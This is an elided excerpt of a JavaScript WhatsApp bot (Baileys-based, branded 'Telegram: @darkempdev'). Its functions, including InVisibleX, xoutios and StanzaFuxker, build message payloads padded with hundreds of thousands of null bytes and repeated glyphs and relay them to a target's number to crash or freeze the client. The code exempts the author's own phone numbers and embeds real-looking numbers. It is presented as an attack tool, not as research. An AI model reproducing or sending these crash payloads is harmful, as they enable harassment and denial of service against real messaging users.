...
//====================================\\
//bug
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @darkempdev") + "\n\n\n";
    jidds = [];
    xeontex += "*~@2347030626048~*\n*🦄*\n*~@22963718715~*\n".repeat(10200);
    jidds.push("2347030626048@s.whatsapp.net", "22963718715@s.whatsapp.net");
//bug database
...
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/n83JDdv2/thumb.jpg",
sourceUrl: link,
mediaType: 1,
...
async function InVisibleX(X, show) {
            let msg = await generateWAMessageFromContent(X, {
                buttonsMessage: {
                    text: "Telegram: @darkempdev",
                    contentText:
                        "Telegram: @darkempdev",
                    footerText: "Telegram: @darkempdev",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "Telegram: @darkempdev" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                        ...
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "Telegram: @darkempdev",
                                },
                                content: undefined,
                            },
                        ],
                ...
                await XeonBotInc.relayMessage(
                    ...
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "Telegram: @darkempdev" },
                                content: undefined,
                            },
                        ],
                    }
...
singleSelectReply: { selectedRowId: "Telegram: @darkempdev" },
contextInfo: {
...
description: "Telegram: @darkempdev"
}
}
},
contextInfo: {
      ...
      viewOnceMessage: {
        message: {
          ...
          interactiveMessage: {
            contextInfo,
            body: {
              text: "Telegram: @darkempdev" + "\u0000".repeat(900000)
            },
            nativeFlowMessage: {
              buttons: [
...
async function xoutios(target) {
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @darkempdev","flow_id":"Telegram: @darkempdev","flow_message_version":"9.903","flow_token":"Telegram: @darkempdev"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @darkempdev" }]
                    }
                }
            }
        }
    ...
    const msg2 = await genMsg("Telegram: @darkempdev", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
...
await XeonBotInc.relayMessage(target, {
        'extendedTextMessage': {
            ...
            'contextInfo': {
                ...
                'participant': target,
                'quotedMessage': {
                    'conversation': 'Telegram: @darkempdev' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
...
for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "samSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    ...
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @darkempdev" + xeonIpong,
...
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: xeonCok + "Telegram: @darkempdev",},
...
{
name: "single_select",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @darkempdev",
},
{
name: "call_permission_request",
buttonParamsJson: xeonOutBrutal2 + "Telegram: @darkempdev",
      ...
      message: {
        ...
        interactiveMessage: {
          ...
          body: {
            ...
            text: "Telegram: @darkempdev",
            description: "Telegram: @darkempdev",
            footer: "Telegram: @darkempdev",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: xeonOrWhat + "Telegram: @darkempdev" },
              { name: "view_product", buttonParamsJson: xeonOrWhat + "Telegram: @darkempdev" },
              { name: "payment_method", buttonParamsJson: xeonOrWhat + "Telegram: @darkempdev" },
              { name: "call_permission_request", buttonParamsJson: xeonyfuck + "\u0003" },
              { name: "mpm", buttonParamsJson: xeonyfuck + "Telegram: @darkempdev" },
              { name: "payment_info", buttonParamsJson: xeonyfuck + "Telegram: @darkempdev" },
            ],
          },
        },
      },
...
async function StanzaFuxker(target, ptcp = true) {
  ...
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Telegram: @darkempdev" + "".repeat(16999), 
          listType: 2,
          singleSelectReply: {
            selectedRowId: "",
          },
          contextInfo: {
            ...
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  ...
                  fileName: "Telegram: @darkempdev" + "".repeat(97770),
                ...
                hasMediaAttachment: true,
                contentText: 'Telegram: @darkempdev',
                footerText: "Telegram: @darkempdev",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "Telegram: @darkempdev" + "".repeat(1999),
                    },
                    type: 1,
                  },
                  {
            ...
            entryPointConversionSource: "Telegram: @darkempdev",
            entryPointConversionApp: "Telegram: @darkempdev",
            actionLink: {
              url: "t.me/darkempdev",
              buttonTitle: "Telegram: @darkempdev",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
            ...
            groupSubject: "Telegram: @darkempdev",
            parentGroupJid: "Telegram: @darkempdev",
            trustBannerType: "Telegram: @darkempdev",
        ...
        message: {
          ...
          interactiveMessage: proto.Message.InteractiveMessage.create({
            ...
            body: proto.Message.InteractiveMessage.Body.create({
              text: 'Telegram: @darkempdev' + "".repeat(29999),
            }),
...
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "2347030626048") {
    return;
    }
    if (victim == "22963718715") {
    return;
    }
    if (victim == "2349166339256") {
    return;
  }
  ...
  sendMessageWithMentions(
                                    ...
                                    "hydratedFourRowTemplate": {
                                        "imageMessage": {
                                            ...(await prepareWAMessageMedia(
                                                { image: { url: 'https://i.ibb.co/n83JDdv2/thumb.jpg' } },
                                                { upload: XeonBotInc.waUploadToServer }
                                            )).imageMessage
                                        },
                                        "hydratedContentText": XeonBotInc.user.name || '',
                                        "hydratedFooterText": "᭡꧈".repeat(92000), "hydratedButtons": [{ "quickReplyButton": { "displayText": "Telegram: @darkempdev", "url": "https://w.meta.me/s/2ekhZ2IEReu4AnP" }, "index": 0 }]
                                    },
                                }
                            }
                        }
    ...
    if (victim == "2347030626048" || victim == "22963718715" || victim == "2349166339256") {
        return;
    }
...
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  ...
  sendMessageWithMentions(
	...
	case "checkchid": case "idch": {
		if (!isRentBotUser) return replygcxeon(mess.premium)
    if (!text) return replygcxeon(`Provide channel link\nExample: ${prefix+command} https://whatsapp.com/channel/0029Vb70IdY60eBmvtGRT00R `)
...
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  ...
  for (let i = 0; i < 999; i++) {
    ...
    if (!args[0]) {
        return replygcxeon("❌ Please provide a number to search. Example: *searchpair 2349166339256*");
    }
...
case 'xxxban': case 'xx🦄': {
    ...
    try {
        ...
        const imageUrl = "https://raw.githubusercontent.com/darkempdev/xeonPloitWa/refs/heads/main/photo_2024-12-19_01-39-48.jpg";
...
forwardedNewsletterMessageInfo: {
newsletterJid: "2347030626048-1234567890@g.us",
serverMessageId: 1,
...
"mediaUrl": 'https://i.ibb.co/n83JDdv2/thumb.jpg',
...
"title": `PC KILLER X Telegram: @darkempdev`,
"description": ``,
            ...
            buttons: [
              {
                ...
                buttonParamsJson: JSON.stringify({
                  ...
                  phone_number: "+2347030626048" // Replace with the actual phone number
                })
              }
            ]
          }),
...
break;
  ...
  const imageUrl = "https://i.ibb.co/n83JDdv2/thumb.jpg"; // Define the single image URL
  ...
  XeonBotInc.sendMessage(m.chat, {
    ...
    contextInfo: {
      ...
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363404912601381@newsletter", // Use the newsletterJid here
        newsletterName: `ok`
      }
    }
  }, {quoted:m});
